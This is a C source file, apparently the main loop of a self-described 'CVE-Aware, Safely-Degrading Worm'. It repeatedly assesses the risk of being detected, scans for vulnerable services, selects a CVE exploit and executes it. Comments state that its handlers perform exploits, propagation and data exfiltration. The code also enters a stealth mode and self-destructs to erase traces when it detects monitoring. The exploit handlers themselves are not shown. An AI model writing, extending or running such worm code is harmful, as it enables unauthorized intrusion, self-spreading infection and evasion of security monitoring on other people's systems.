#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "risk_assessment.h"
#include "handler_registry.h"
#include "decision_engine.h"
#include "state_manager.h"
#include "degradation.h"
#include "utils.h"
#include "cve_ssh_propagation.h"

// Configuration
#define REMOTE_WORM_PATH "/tmp/worm"
#define WORM_LOG_PATH "/tmp/worm.log"

/**
 * Phase 1: Scan Phase
 * Executes all registered scan handlers to discover vulnerabilities.
 * 
 * @param target_ip Optional target IP address. Handlers may ignore this parameter
 *                  if they perform their own scanning logic (e.g., network discovery).
 *                  Pass NULL to let handlers decide their scanning strategy.
 * @return Vector of scan results containing vulnerability status for each registered CVE.
 * 
 * @note Each handler is responsible for determining what to scan (local system checks,
 *       network discovery, remote host scanning, etc.). The engine does not dictate
 *       scanning strategy - it only orchestrates handler execution.
 */
static cve_result_vector_t phase1_scan(const char* target_ip) {
    return scan_all_handlers(target_ip);
}

/**
 * Phase 2: Decision Phase
 * Selects the most appropriate CVE to execute based on scan results and risk assessment.
 * 
 * @param scan_results Vector of scan results from all handlers, indicating which CVEs
 *                     are vulnerable and their confidence levels.
 * @param risk Current risk assessment indicating detection signals and safety levels.
 * @return Decision result containing the selected CVE ID and execution flag.
 * 
 * @note Risk-based mode selection:
 *       - Normal mode (risk < 4): Full operations allowed
 *       - Stealth mode (risk 4-6): Reduced activity, longer delays
 *       - Self-destruct (risk >= 7): Immediate termination (handled by main loop)
 * 
 * @note The decision engine evaluates CVEs in priority order and selects the first
 *       one that meets all criteria (vulnerability, port availability, confidence,
 *       risk threshold, mode compatibility).
 */
static decision_result_t phase2_decision(cve_result_vector_t* scan_results, 
                                         risk_assessment_t* risk) {
    degradation_mode_t mode = MODE_NORMAL;
    // Enter stealth mode if risk is high but not critical
    if (risk->total_risk >= 4 && risk->total_risk < 7) {
        mode = MODE_STEALTH;
    }
    
    return make_decision(scan_results, risk, mode);
}

/**
 * Phase 3: Execution Phase
 * Executes the selected CVE's execution handler.
 * 
 * @param cve_id The CVE ID to execute (as returned by decision phase).
 * @param target_ip Optional target IP address. Handlers may ignore this if they use
 *                  their own target lists (e.g., from scan phase).
 * @param argv0 Program name (currently unused, reserved for self-replication).
 * @return 1 on successful execution, 0 on failure.
 * 
 * @note Updates operation counters for risk assessment behavioral signals.
 *       Success/failure metrics influence future risk calculations.
 */
static int phase3_execute(int cve_id, const char* target_ip, const char* argv0) {
    (void)argv0;
    
    cve_handler_config_t* handler = get_handler(cve_id);
    if (!handler) {
        printf("[-] Handler not found for CVE ID %d\n", cve_id);
        return 0;
    }
    
    if (target_ip) {
        printf("[*] Executing CVE ID %d on %s...\n", cve_id, target_ip);
    } else {
        printf("[*] Executing CVE ID %d...\n", cve_id);
    }
    
    int execution_success = call_execution_handler(handler, target_ip);
    
    if (execution_success) {
        if (target_ip) {
            printf("[+] Execution successful on %s\n", target_ip);
        } else {
            printf("[+] Execution successful\n");
        }
        update_successful_operation();
        return 1;
    } else {
        if (target_ip) {
            printf("[-] Execution failed on %s\n", target_ip);
        } else {
            printf("[-] Execution failed\n");
        }
        update_failed_operation();
        return 0;
    }
}

/**
 * Main Entry Point
 * Implements the CVE-aware, safely-degrading worm's 4-phase engine.
 * 
 * Engine Architecture:
 * 
 * Phase 0: Risk Assessment
 *   - Evaluates detection signals from network, system, and behavioral sources
 *   - Calculates weighted risk score (0-10)
 *   - Triggers degradation modes: normal (<4), stealth (4-6), self-destruct (>=7)
 * 
 * Phase 1: Scan
 *   - Executes all registered scan handlers
 *   - Collects vulnerability information for decision phase
 *   - Handlers perform local/remote scanning as appropriate
 * 
 * Phase 2: Decision
 *   - Evaluates scan results against decision rules in priority order
 *   - Selects highest-priority CVE that meets all criteria
 *   - Considers: vulnerability status, port availability, confidence, risk level, mode
 * 
 * Phase 3: Execute
 *   - Runs the selected CVE's execution handler
 *   - Updates operation counters for risk assessment
 *   - Handlers perform exploits, propagation, data exfiltration, etc.
 * 
 * Safety Features:
 *   - Risk-based degradation prevents detection in monitored environments
 *   - Self-destruction mode cleans up traces before exit
 *   - State management prevents duplicate infections and infinite loops
 * 
 * @param argc Argument count (unused).
 * @param argv Argument vector. argv[0] contains program name.
 * @return Always returns 0 (self-destruct exits via exit(0)).
 * 
 * @note All output is redirected to /tmp/worm.log for persistent logging.
 *       Use `tail -f /tmp/worm.log` to monitor worm activity.
 */
int main(int argc, char* argv[]) {
    (void)argc;
    
    // Redirect stdout and stderr to log file
    FILE* log_file = freopen(WORM_LOG_PATH, "a", stdout);
    if (log_file == NULL) {
        // Continue without logging if file can't be opened
    }
    // Also redirect stderr to the same log file
    freopen(WORM_LOG_PATH, "a", stderr);
    
    // Flush to ensure logs are written immediately
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    
    printf("=== CVE-Aware, Safely-Degrading Worm ===\n");
    
    init_handler_registry();
    init_decision_rules();
    init_state();
    
    sleep(2);
    
    // Main infection loop: 4-phase engine (Risk Assessment -> Scan -> Decision -> Execute)
    while (1) {
        printf("\n[*] Starting infection round...\n");
        
        // Phase 0: Risk Assessment - evaluates detection signals before any operations
        printf("[*] Phase 0: Risk Assessment - waiting 3 seconds...\n");
        sleep(3);
        risk_assessment_t risk = assess_risk();
        printf("\n=== RISK ASSESSMENT ===\n");
        printf("[*] Total Risk: %d/10\n", risk.total_risk);
        printf("[*] Network Risk: %d/10\n", risk.network_risk);
        printf("[*] System Risk: %d/10\n", risk.system_risk);
        printf("[*] Behavioral Risk: %d/10\n", risk.behavioral_risk);
        
        // Critical risk threshold: self-destruct to avoid detection
        if (risk.total_risk >= 7) {
            printf("\n[!] CRITICAL RISK DETECTED (>= 7/10)\n");
            printf("[!] Risk level exceeds safe threshold for continued operation\n");
            if (risk.system_risk >= 10) {
                printf("[!] High-risk server environment detected (monitored/security environment)\n");
            }
            printf("[!] Entering SELF-DESTRUCTION mode...\n");
            printf("[!] Cleaning up all traces and exiting to avoid detection\n");
            self_destruct();
            break;
        }
        
        // High risk threshold: reduce activity but continue operations
        if (risk.total_risk >= 4) {
            printf("\n[!] HIGH RISK DETECTED (>= 4/10)\n");
            printf("[!] Entering STEALTH mode...\n");
            enter_stealth_mode();
        } else {
            printf("[+] Risk level acceptable, proceeding with normal operations\n");
        }
        
        // Phase 1: Scan - call all scan handlers
        // Each handler decides what to scan (local or remote) internally
        printf("\n[*] Phase 1: Scan - waiting 3 seconds...\n");
        sleep(3);
        printf("\n=== SCAN PHASE ===\n");
        cve_result_vector_t scan_results = phase1_scan(NULL);
        printf("[*] Scan complete: %d CVE handler(s) checked\n", scan_results.count);
        
        // Log scan results
        printf("\n=== SCAN RESULTS ===\n");
        for (int j = 0; j < scan_results.count; j++) {
            cve_scan_result_t* result = &scan_results.results[j];
            printf("[*] CVE ID %d: ", result->cve_id);
            if (result->is_vulnerable) {
                printf("VULNERABLE (confidence: %d/10", result->confidence);
                if (result->port_open > 0) {
                    printf(", port %d open", result->port_open);
                }
                if (result->service_type[0] != '\0') {
                    printf(", service: %s", result->service_type);
                }
                printf(")\n");
            } else {
                printf("NOT VULNERABLE (confidence: %d/10)\n", result->confidence);
            }
        }
        
        // Phase 2: Decision - select best CVE based on priority and conditions
        printf("\n[*] Phase 2: Decision - waiting 3 seconds...\n");
        sleep(3);
        printf("\n=== DECISION PHASE ===\n");
        decision_result_t decision = phase2_decision(&scan_results, &risk);
        
        if (!decision.should_execute) {
            printf("[-] No suitable CVE selected\n");
            printf("[-] Reason: No CVE met all decision criteria (vulnerable, port, confidence, risk, mode)\n");
        } else {
            printf("[+] Selected CVE ID %d for execution\n", decision.selected_cve_id);
            
            // Phase 3: Execute - run the selected CVE's execution handler
            printf("\n[*] Phase 3: Execute - waiting 3 seconds...\n");
            sleep(3);
            printf("\n=== EXECUTION PHASE ===\n");
            printf("[*] Executing CVE ID %d...\n", decision.selected_cve_id);
            if (phase3_execute(decision.selected_cve_id, NULL, argv[0])) {
                printf("[+] Execution successful\n");
            } else {
                printf("[-] Execution failed\n");
                update_failed_connection();
            }
        }
        
        printf("[*] Round complete. Sleeping 20 seconds...\n");
        sleep(20);
    }
    
    return 0;
}

